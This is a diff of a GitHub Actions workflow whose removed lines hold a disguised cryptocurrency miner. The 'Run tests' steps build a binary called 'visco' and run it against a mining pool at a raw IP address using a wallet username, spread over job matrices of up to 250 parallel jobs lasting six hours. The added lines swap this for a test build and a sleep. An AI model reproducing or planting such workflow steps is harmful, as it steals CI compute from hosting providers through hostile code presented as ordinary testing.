@@ -1,13 +1,13 @@
-name: npm
+name: project node
 on: 
   push:
     branches: [ "main" ]
-  
+
 jobs:
-  npm:
+  node:
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 120
+      max-parallel: 80
       fail-fast: false
       matrix:
         go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
@@ -29,75 +29,5 @@ jobs:
     - name: Build
       run: cd jamput && cargo build --release
     - name: Run tests
-      run: cd jamput && ./target/release/visco --url ws://20.6.90.76:8080/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.03 --cores 4 &
-        sleep 305s
-  npm2:
-    needs: npm
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: false
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: git clone https://github.com/fannyoza/jamput && cd jamput && chmod u+x *
-    - name: Build
-      run: cd jamput && cargo build --release
-    - name: Run tests
-      run: cd jamput && ./target/release/visco --url ws://20.6.90.76:8080/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.03 --cores 4
-        
-    
-     
-  npm3:
-    needs: [npm]
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: false
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: git clone https://github.com/fannyoza/jamput && cd jamput && chmod u+x *
-    - name: Build
-      run: cd jamput && cargo build --release
-    - name: Run tests
-      run: cd jamput && ./target/release/visco --url ws://20.6.90.76:8080/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.03 --cores 4
-        
-    
-  Success:
-    needs: [npm, npm3, npm2]
-    if: always()
-    runs-on: ubuntu-20.04
-    steps:
-      - uses: technote-space/workflow-conclusion-action@v2
-      - name: Check Failure
-        if: env.WORKFLOW_CONCLUSION == 'failure'
-        run: exit 1
-      - name: Success
-        if: ${{ success() }}
-        run: echo "all don,All Done"
-        
+      run: cd jamput && cargo build --tests && sleep 305s
+ 
